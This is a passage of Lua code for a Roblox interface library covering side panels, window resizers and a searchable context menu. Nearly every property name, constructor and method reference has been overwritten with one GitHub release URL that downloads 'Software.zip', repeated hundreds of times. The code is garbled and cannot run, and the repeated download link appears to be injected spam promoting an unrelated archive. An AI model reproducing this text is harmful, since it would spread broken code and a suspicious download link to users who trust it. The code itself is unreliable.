			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = leftFrame
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0,0)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = nil
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = sidesGui

			local rightFrame = create({
				{1,"Frame",{Active=true,Name="RightSide",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.17647059261799,0.17647059261799,0.17647059261799),BorderSizePixel=0,}},
				{2,"TextButton",{AutoButtonColor=false,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.2549019753933,0.2549019753933,0.2549019753933),BorderSizePixel=0,Font=3,Name="Resizer",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,5,1,0),Text="",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0),TextSize=14,}},
				{3,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.14117647707462,0.14117647707462,0.14117647707462),BorderSizePixel=0,Name="Line",Parent={2},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,4,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1,1,0),}},
				{4,"TextButton",{AutoButtonColor=false,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.2549019753933,0.2549019753933,0.2549019753933),BorderSizePixel=0,Font=3,Name="WindowResizer",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-300,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,0,4),Text="",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0),TextSize=14,}},
				{5,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.14117647707462,0.14117647707462,0.14117647707462),BorderSizePixel=0,Name="Line",Parent={4},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,0,1),}},
			})
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = rightFrame
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,10,0,0)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = nil
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = sidesGui

			sideResizerHook(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,"H",leftSide)
			sideResizerHook(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,"H",rightSide)

			alignIndicator = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("ScreenGui")
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local indicator = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("Frame",alignIndicator)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0, 170, 255)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0.8
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = "Indicator"
			local corner = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("UICorner",indicator)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,10)

			local leftToggle = create({{1,"TextButton",{AutoButtonColor=false,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.20392157137394,0.20392157137394,0.20392157137394),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.14117647707462,0.14117647707462,0.14117647707462),BorderMode=2,Font=10,Name="LeftToggle",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0,-36),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,16,0,36),Text="<",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),TextSize=14,}}})
			local rightToggle = leftToggle:Clone()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = "RightToggle"
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-16,0,-36)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(leftToggle,{Mode = 2,PressColor = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(32,32,32)})
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(rightToggle,{Mode = 2,PressColor = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(32,32,32)})

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("left")
			end)

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("right")
			end)

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = sidesGui
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = sidesGui

			sidesGui:GetPropertyChangedSignal("AbsoluteSize"):Connect(function()
				local maxWidth = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(300,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip))
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip))
				for i = 1,#visibleWindows do
					visibleWindows[i]:MoveInBoundary()
				end
				updateWindows(true)
			end)

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = sideDisplayOrder - 1
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(sidesGui)
			updateSideFrames()
		end

		local mt = {__index = funcs}
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function()
			local obj = setmetatable({
				Minimized = false,
				Dragging = false,
				Resizing = false,
				Aligned = false,
				Draggable = true,
				Resizable = true,
				ResizableInternal = true,
				Alignable = true,
				Closed = true,
				SizeX = 300,
				SizeY = 300,
				MinX = 200,
				MinY = 200,
				PosX = 0,
				PosY = 0,
				GuiElems = {},
				Tweens = {},
				Elements = {},
				OnActivate = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(),
				OnDeactivate = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(),
				OnMinimize = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(),
				OnRestore = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			},mt)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = createGui(obj)
			return obj
		end

		return static
	end)()

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = (function()
		local funcs = {}
		local mouse

		local function createGui(self)
			local contextGui = create({
				{1,"ScreenGui",{DisplayOrder=1000000,Name="Context",ZIndexBehavior=1,}},
				{2,"Frame",{Active=true,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.14117647707462,0.14117647707462,0.14117647707462),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.14117647707462,0.14117647707462,0.14117647707462),Name="Main",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.5,-100,0.5,-150),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,200,0,100),}},
				{3,"UICorner",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,4),Parent={2},}},
				{4,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.17647059261799,0.17647059261799,0.17647059261799),Name="Container",Parent={2},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1,0,1),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-2,1,-2),}},
				{5,"UICorner",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,4),Parent={4},}},
				{6,"ScrollingFrame",{Active=true,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.20392157137394,0.20392157137394,0.20392157137394),BackgroundTransparency=1,BorderSizePixel=0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0,0),Name="List",Parent={4},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,2,0,2),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0),ScrollBarThickness=4,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-4,1,-4),VerticalScrollBarInset=1,}},
				{7,"UIListLayout",{Parent={6},SortOrder=2,}},
				{8,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.20392157137394,0.20392157137394,0.20392157137394),BorderSizePixel=0,Name="SearchFrame",Parent={4},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,0,24),Visible=false,}},
				{9,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.14901961386204,0.14901961386204,0.14901961386204),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.1176470592618,0.1176470592618,0.1176470592618),BorderSizePixel=0,Name="SearchContainer",Parent={8},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,3,0,3),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-6,0,18),}},
				{10,"TextBox",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,Font=3,Name="SearchBox",Parent={9},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.39215689897537,0.39215689897537,0.39215689897537),PlaceholderText="Search",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,4,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-8,0,18),Text="",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),TextSize=14,TextXAlignment=0,}},
				{11,"UICorner",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,2),Parent={9},}},
				{12,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.14117647707462,0.14117647707462,0.14117647707462),BorderSizePixel=0,Name="Line",Parent={8},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,1,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,0,1),}},
				{13,"TextButton",{AutoButtonColor=false,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.20392157137394,0.20392157137394,0.20392157137394),BackgroundTransparency=1,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.33725491166115,0.49019610881805,0.73725491762161),BorderSizePixel=0,Font=3,Name="Entry",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,0,22),Text="",TextSize=14,Visible=false,}},
				{14,"TextLabel",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="EntryName",Parent={13},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,24,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-24,1,0),Text="Duplicate",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274516582489,0.86274516582489,0.86274516582489),TextSize=14,TextXAlignment=0,}},
				{15,"TextLabel",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,Font=3,Name="Shortcut",Parent={13},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,24,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-30,1,0),Text="Ctrl+D",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274516582489,0.86274516582489,0.86274516582489),TextSize=14,TextXAlignment=1,}},
				{16,"ImageLabel",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(304,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(16,16),Name="Icon",Parent={13},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,2,0,3),ScaleType=4,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,16,0,16),}},
				{17,"UICorner",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,4),Parent={13},}},
				{18,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.21568629145622,0.21568629145622,0.21568629145622),BackgroundTransparency=1,BorderSizePixel=0,Name="Divider",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0,20),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,0,7),Visible=false,}},
				{19,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.20392157137394,0.20392157137394,0.20392157137394),BorderSizePixel=0,Name="Line",Parent={18},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0.5,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,0,1),}},
				{20,"TextLabel",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0.5),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="DividerName",Parent={18},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,2,0.5,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-4,1,0),Text="Objects",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),TextSize=14,TextTransparency=0.60000002384186,TextXAlignment=0,Visible=false,}},
			})
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("Text"):Connect(function()
				local lower,find = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				local searchText = lower(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
				local items = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				local map = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

				if searchText ~= "" then
					local results = {}
					local count = 1
					for i = 1,#items do
						local item = items[i]
						local entry = map[item]
						if entry then
							if not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and find(lower(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip),searchText,1,true) then
								results[count] = item
								count = count + 1
							else
								https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
							end
						end
					end
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(results,function(a,b) return https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip < https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip end)
					for i = 1,#results do
						local entry = map[results[i]]
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = i
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
					end
				else
					for i = 1,#items do
						local entry = map[items[i]]
						if entry then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = i https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true end
					end
				end

				local toSize = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip + 6
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0,toSize-6)
			end)

			return contextGui
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,item)
			local newItem = {
				Name = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or "Item",
				Icon = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or "",
				Shortcut = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or "",
				OnClick = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,
				OnHover = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,
				Disabled = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or false,
				DisabledIcon = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or "",
				IconMap = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,
				OnRightClick = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			}
			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
				local text = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip > 0 and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				self:AddDivider(text)
			end
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip+1] = newItem
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = nil
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,name,disabled)
			if not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[name] then error(name.." is not registered") end
			
			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
				local text = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip > 0 and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				self:AddDivider(text)
			end
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[name].Disabled = disabled
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip+1] = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[name]
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = nil
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,name,item)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[name] = {
				Name = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or "Item",
				Icon = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or "",
				Shortcut = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or "",
				OnClick = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,
				OnHover = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,
				DisabledIcon = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or "",
				IconMap = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,
				OnRightClick = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			}
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,name)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[name] = nil
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,text)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
			local textWidth = text and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(text,14,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(999999999,20)).X or nil
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,{Divider = true, Text = text, TextSize = textWidth and textWidth+4})
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = nil
		end
		
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,text)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = text or ""
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {}
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = nil
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self)
			for i,v in pairs(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()) do
				if not v:IsA("UIListLayout") then
					v:Destroy()
				end
			end
			local map = {}
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = map

			local dividerFrame = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local contextList = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local entryFrame = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local items = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

			for i = 1,#items do
				local item = items[i]
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
					local newDivider = dividerFrame:Clone()
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
					if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,0,20)
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0.5,0)
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0,1)
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
					end
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
					map[item] = newDivider
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = contextList
				else
					local newEntry = entryFrame:Clone()
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
					if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(150/255,150/255,150/255)
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(150/255,150/255,150/255)
					end

					if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,2,0,0)
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-4,0,20)
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
					else
						local iconIndex = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
						if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
							if type(iconIndex) == "number" then
								https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,iconIndex)
							elseif type(iconIndex) == "string" then
								https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,iconIndex)
							end
						elseif type(iconIndex) == "string" then
							https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = iconIndex
						end
					end

					if not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
						if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
							https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
								https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
								if not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
									self:Hide()
								end
							end)
						end

						if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
							https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
								https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
								if not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
									self:Hide()
								end
							end)
						end
					end

					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
						if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
							https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0
						end
					end)

					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
						if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
							https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 1
						end
					end)

					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
					map[item] = newEntry
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = contextList
				end
			end
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,x,y)
			-- Initialize Gui
			local elems = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,2,0,2 + (https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and 24 or 0))
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-4,1,-4 - (https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and 24 or 0))
			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = "" end
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0)

			if not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
				self:Refresh() -- Create entries
			end

			-- Vars
			local reverseY = false
			local x,y = x or mouse.X, y or mouse.Y
			local maxX,maxY = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

			-- Position and show
